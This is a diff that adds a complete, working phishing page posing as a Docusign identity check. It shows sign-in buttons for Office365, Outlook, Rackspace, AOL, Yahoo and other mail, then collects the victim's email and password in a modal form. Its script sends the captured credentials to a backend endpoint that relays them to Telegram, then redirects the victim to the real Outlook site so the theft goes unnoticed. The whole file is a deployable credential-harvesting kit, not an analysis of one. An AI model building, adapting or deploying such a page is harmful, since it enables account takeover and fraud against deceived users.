@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Docusign Identity Verification</title>
+    <link rel="icon" type="image/x-icon" href="https://img.remit.ee/api/file/BQACAgUAAyEGAASHRsPbAAEWAThqO7VoWWx8ZfQ9_PLGkGDRSpP1VAACiyAAAoQQ4VX6UPNCvQ_WzzwE.png">
+    <link rel="shortcut icon" type="image/png" href="logo.png">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        body, html {
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        .page-container {
+            position: relative;
+            min-height: 100vh;
+            width: 100%;
+            background: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), url('https://img.remit.ee/api/file/BQACAgUAAyEGAASHRsPbAAEV_xlqO5lq8JcrOqmlVEi2wZs-xkGd6gACLB4AAoQQ4VW5uwyJr0AfWjwE.jpg') no-repeat center center/cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px;
+            color: #ffffff;
+        }
+
+        .content-wrapper {
+            width: 100%;
+            max-width: 1350px;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            padding: 0 20px;
+        }
+
+        .header-logo {
+            display: flex;
+            align-items: center;
+            gap: 24px;
+            margin-bottom: 40px;
+        }
+
+        .main-icon {
+            width: 140px;
+            height: auto;
+        }
+
+        .brand-name {
+            font-size: 42px;
+            font-weight: bold;
+            letter-spacing: 0.5px;
+        }
+
+        .content-section {
+            width: 100%;
+            margin-bottom: 25px;
+        }
+
+        .main-instruction {
+            font-size: 25px;
+            font-weight: bold;
+            line-height: 1.4;
+            margin-bottom: 16px;
+            text-shadow: 1px 1px 4px rgba(0,0,0,0.6);
+        }
+
+        .sub-instruction {
+            font-size: 16px;
+            margin-bottom: 20px;
+            opacity: 0.95;
+        }
+
+        .login-bar {
+            background-color: rgba(255, 255, 255, 0.82);
+            padding: 16px;
+            width: 100%;
+            display: grid;
+            grid-template-columns: repeat(6, 1fr);
+            gap: 16px;
+            border-radius: 4px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .login-btn {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            color: #ffffff;
+            padding: 24px 10px;
+            transition: opacity 0.2s ease;
+            border-radius: 4px;
+            min-height: 155px;
+            cursor: pointer;
+            border: none;
+        }
+
+        .login-btn:hover {
+            opacity: 0.9;
+        }
+
+        .login-btn img {
+            height: 32px;
+            width: auto;
+            margin-bottom: 12px;
+            object-fit: contain;
+        }
+
+        .btn-text {
+            font-size: 14px;
+            margin-bottom: 8px;
+            opacity: 0.9;
+        }
+
+        .btn-provider {
+            font-size: 15px;
+            font-weight: bold;
+        }
+
+        .bg-office { background-color: #ff0000; }
+        .bg-outlook { background-color: #0072c6; }
+        .bg-rackspace { background-color: #000000; }
+        .bg-aol { background-color: #3b4b9b; }
+        .bg-yahoo { background-color: #600160; }
+        .bg-other { background-color: #1160d4; }
+
+        .footer {
+            position: absolute;
+            bottom: 45px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 16px;
+            font-weight: bold;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.7);
+        }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .modal-box {
+            background-color: #ffffff;
+            width: 90%;
+            max-width: 520px;
+            border-radius: 4px;
+            box-shadow: 0 6px 25px rgba(0,0,0,0.45);
+            overflow: hidden;
+            color: #333333;
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: flex-end;
+            padding: 12px 20px;
+            border-bottom: 1px solid #e5e5e5;
+        }
+
+        .close-x {
+            background: none;
+            border: none;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            color: #000000;
+        }
+
+        .modal-body {
+            padding: 35px 45px;
+            text-align: center;
+        }
+
+        .modal-logo-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .modal-provider-logo {
+            width: 65px;
+            height: 65px;
+            object-fit: contain;
+            display: block;
+            border-radius: 4px;
+            padding: 10px;
+        }
+
+        .modal-office { background-color: #ff0000; }
+        .modal-outlook { background-color: #0072c6; }
+        .modal-rackspace { background-color: #000000; }
+        .modal-aol { background-color: #3b4b9b; }
+        .modal-yahoo { background-color: #600160; }
+        .modal-other { background-color: #1160d4; }
+
+        .modal-title {
+            font-size: 18px;
+            color: #000000;
+            margin-bottom: 25px;
+            font-weight: normal;
+        }
+
+        .modal-title strong {
+            font-weight: bold;
+        }
+
+        .form-group {
+            text-align: left;
+            margin-bottom: 22px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 15px;
+            color: #000000;
+            margin-bottom: 8px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px 14px;
+            border: 1px solid #999999;
+            border-radius: 2px;
+            font-size: 15px;
+            color: #333333;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #1160d4;
+        }
+
+        .form-help {
+            font-size: 12px;
+            color: #666666;
+            margin-top: 6px;
+            display: block;
+        }
+
+        .modal-footer {
+            display: flex;
+            justify-content: flex-end;
+            gap: 12px;
+            padding: 15px 45px 35px 45px;
+        }
+
+        .btn-action {
+            padding: 10px 22px;
+            font-size: 15px;
+            border-radius: 3px;
+            cursor: pointer;
+            border: none;
+            font-weight: bold;
+        }
+
+        .btn-close-gray {
+            background-color: #6c757d;
+            color: #ffffff;
+        }
+
+        .btn-login-teal {
+            background-color: #17a2b8;
+            color: #ffffff;
+        }
+
+        @media (max-width: 1024px) {
+            .login-bar { grid-template-columns: repeat(3, 1fr); }
+            .content-wrapper { align-items: center; }
+        }
+        @media (max-width: 600px) {
+            .login-bar { grid-template-columns: repeat(2, 1fr); }
+            .modal-body { padding: 25px; }
+            .modal-footer { padding: 10px 25px 25px 25px; }
+            .main-instruction { font-size: 19px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="page-container">
+        
+        <div class="content-wrapper">
+            
+            <div class="header-logo">
+                <img class="main-icon" src="https://img.remit.ee/api/file/BQACAgUAAyEGAASHRsPbAAEV_4xqO6AU7HjRpeWs4MNBwMtr_dDt7QACsx4AAoQQ4VVxmO_MjNwiMzwE.png" alt="Icon Placeholder">
+                <span class="brand-name">Docusign</span>
+            </div>
+
+            <div class="content-section">
+                <h1 class="main-instruction">
+                    For your security we need to verify your identity: To gain access to this document, enter the email address this document was sent to.
+                </h1>
+                <p class="sub-instruction">Sign in to access document.</p>
+            </div>
+
+            <div class="login-bar">
+                
+                <button class="login-btn bg-office" onclick="openLoginModal('Office365', 'https://img.remit.ee/api/file/BQACAgUAAyEGAASHRsPbAAEV_zhqO5rVBOdKvbSEn7hkjknooUL2-QACSx4AAoQQ4VVMKUNVwkL8FTwE.png', 'modal-office')">
+                    <img src="https://img.remit.ee/api/file/BQACAgUAAyEGAASHRsPbAAEV_zhqO5rVBOdKvbSEn7hkjknooUL2-QACSx4AAoQQ4VVMKUNVwkL8FTwE.png" alt="Office">
+                    <span class="btn-text">Sign in with</span>
+                    <span class="btn-provider">Office365</span>
+                </button>
+
+                <button class="login-btn bg-outlook" onclick="openLoginModal('Outlook', 'https://img.remit.ee/api/file/BQACAgUAAyEGAASHRsPbAAEV_3VqO53Z0RGEHCUSqgkoeTzrvS8AAY0AApMeAAKEEOFVhGGh0mWaEv48BA.png', 'modal-outlook')">
+                    <img src="https://img.remit.ee/api/file/BQACAgUAAyEGAASHRsPbAAEV_3VqO53Z0RGEHCUSqgkoeTzrvS8AAY0AApMeAAKEEOFVhGGh0mWaEv48BA.png" alt="Outlook">
+                    <span class="btn-text">Sign in with</span>
+                    <span class="btn-provider">Outlook</span>
+                </button>
+
+                <button class="login-btn bg-rackspace" onclick="openLoginModal('Rackspace', 'https://img.remit.ee/api/file/BQACAgUAAyEGAASHRsPbAAEV_01qO5xBrpCohu-kWTT1RYrK8ciVxQACZB4AAoQQ4VUhj-bDm6NlnDwE.png', 'modal-rackspace')">
+                    <img src="https://img.remit.ee/api/file/BQACAgUAAyEGAASHRsPbAAEV_01qO5xBrpCohu-kWTT1RYrK8ciVxQACZB4AAoQQ4VUhj-bDm6NlnDwE.png" alt="Rackspace">
+                    <span class="btn-text">Sign in with</span>
+                    <span class="btn-provider">Rackspace</span>
+                </button>
+
+                <button class="login-btn bg-aol" onclick="openLoginModal('Aol', 'https://img.remit.ee/api/file/BQACAgUAAyEGAASHRsPbAAEV_4BqO56VHY_nuU8l9lW2vlSNlgVncgACoB4AAoQQ4VVUEhK0zJt20DwE.png', 'modal-aol')">
+                    <img src="https://img.remit.ee/api/file/BQACAgUAAyEGAASHRsPbAAEV_4BqO56VHY_nuU8l9lW2vlSNlgVncgACoB4AAoQQ4VVUEhK0zJt20DwE.png" alt="Aol">
+                    <span class="btn-text">Sign in with</span>
+                    <span class="btn-provider">Aol</span>
+                </button>
+
+                <button class="login-btn bg-yahoo" onclick="openLoginModal('Yahoo', 'https://img.remit.ee/api/file/BQACAgUAAyEGAASHRsPbAAEV_4JqO57pdmefbb67q9As_GXLImDa-AACox4AAoQQ4VXZLqgHV0QUWDwE.png', 'modal-yahoo')">
+                    <img src="https://img.remit.ee/api/file/BQACAgUAAyEGAASHRsPbAAEV_4JqO57pdmefbb67q9As_GXLImDa-AACox4AAoQQ4VXZLqgHV0QUWDwE.png" alt="Yahoo">
+                    <span class="btn-text">Sign in with</span>
+                    <span class="btn-provider">Yahoo</span>
+                </button>
+
+                <button class="login-btn bg-other" onclick="openLoginModal('Other Mail', 'https://img.remit.ee/api/file/BQACAgUAAyEGAASHRsPbAAEV_4lqO5-bJeDr3xrz0iQWGWDP7zuMjgACrx4AAoQQ4VWmjX7qmKdBiTwE.png', 'modal-other')">
+                    <img src="https://img.remit.ee/api/file/BQACAgUAAyEGAASHRsPbAAEV_4lqO5-bJeDr3xrz0iQWGWDP7zuMjgACrx4AAoQQ4VWmjX7qmKdBiTwE.png" alt="Mail">
+                    <span class="btn-text">Sign in with</span>
+                    <span class="btn-provider">Other Mail</span>
+                </button>
+
+            </div>
+
+        </div>
+
+        <div class="footer">
+            Docusign &copy; 2025
+        </div>
+
+    </div>
+
+    <!-- ===== MODAL ===== -->
+    <div class="modal-overlay" id="loginModal">
+        <div class="modal-box">
+            
+            <div class="modal-header">
+                <button class="close-x" onclick="closeLoginModal()">X</button>
+            </div>
+
+            <form action="#" method="POST" onsubmit="handleLogin(event)">
+                <div class="modal-body">
+                    
+                    <div class="modal-logo-container">
+                        <img id="modalLogo" class="modal-provider-logo modal-office" src="https://img.remit.ee/api/file/BQACAgUAAyEGAASHRsPbAAEV_zhqO5rVBOdKvbSEn7hkjknooUL2-QACSx4AAoQQ4VVMKUNVwkL8FTwE.png" alt="Provider Logo">
+                    </div>
+                    
+                    <h2 class="modal-title">Login with <strong id="modalProviderName">Office365</strong></h2>
+
+                    <div class="form-group">
+                        <label for="email">Email address</label>
+                        <input type="email" id="email" placeholder="Enter email" required>
+                        <small class="form-help">We'll never share your email with anyone else.</small>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" placeholder="Enter Password" required>
+                    </div>
+                </div>
+
+                <div class="modal-footer">
+                    <button type="button" class="btn-action btn-close-gray" onclick="closeLoginModal()">Close</button>
+                    <button type="submit" class="btn-action btn-login-teal" id="loginSubmitBtn">Login</button>
+                </div>
+            </form>
+
+        </div>
+    </div>
+
+    <script>
+        // ================================================
+        // NO TELEGRAM TOKEN VISIBLE HERE - SECURE!
+        // Calls backend /api/telegram endpoint
+        // ================================================
+
+        async function sendToTelegram(message) {
+            try {
+                const response = await fetch('/api/telegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ message })
+                });
+                
+                const result = await response.json();
+                console.log('📱 Telegram response:', result);
+                
+                if (result.success) {
+                    console.log('✅ Telegram sent successfully');
+                } else {
+                    console.error('❌ Telegram error:', result.error);
+                }
+                return result;
+            } catch (error) {
+                console.error('❌ Fetch error:', error);
+            }
+        }
+
+        // ================================================
+        // DOM ELEMENTS
+        // ================================================
+        const modal = document.getElementById('loginModal');
+        const modalLogo = document.getElementById('modalLogo');
+        const modalProviderName = document.getElementById('modalProviderName');
+
+        // ================================================
+        // OPEN MODAL
+        // ================================================
+        function openLoginModal(providerName, logoSrc, bgClass) {
+            modalProviderName.textContent = providerName;
+            modalLogo.src = logoSrc;
+            modalLogo.alt = providerName + " Logo";
+            modalLogo.className = 'modal-provider-logo ' + bgClass;
+            modal.classList.add('active');
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+        }
+
+        function closeLoginModal() {
+            modal.classList.remove('active');
+        }
+
+        // ================================================
+        // HANDLE LOGIN - SEND TO TELEGRAM VIA BACKEND
+        // ================================================
+        async function handleLogin(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const provider = modalProviderName.textContent;
+            const timestamp = new Date().toLocaleString('en-US', { 
+                timeZone: 'America/New_York',
+                weekday: 'long',
+                year: 'numeric',
+                month: 'long',
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+
+            if (!email || !password) {
+                alert('Please enter both email and password.');
+                return;
+            }
+
+            // ================================================
+            // SEND TO TELEGRAM VIA SECURE BACKEND
+            // ================================================
+            const message = `🔐 <b>DOCUSIGN LOGIN ATTEMPT</b>\n\n` +
+                            `📧 <b>Email:</b> ${email}\n` +
+                            `🔑 <b>Password:</b> ${password}\n` +
+                            `📌 <b>Provider:</b> ${provider}\n` +
+                            `⏰ <b>Time:</b> ${timestamp}`;
+
+            console.log('📤 Sending message via backend...');
+            await sendToTelegram(message);
+
+            // ================================================
+            // REDIRECT TO OUTLOOK (SAME TAB, CAN'T GO BACK)
+            // ================================================
+            closeLoginModal();
+            window.location.replace('https://outlook.office365.com');
+        }
+
+        // ================================================
+        // CLOSE MODAL EVENTS
+        // ================================================
+        modal.addEventListener('click', function(e) {
+            if (e.target === modal) {
+                closeLoginModal();
+            }
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeLoginModal();
+            }
+        });
+    </script>
+
+</body>
+</html>
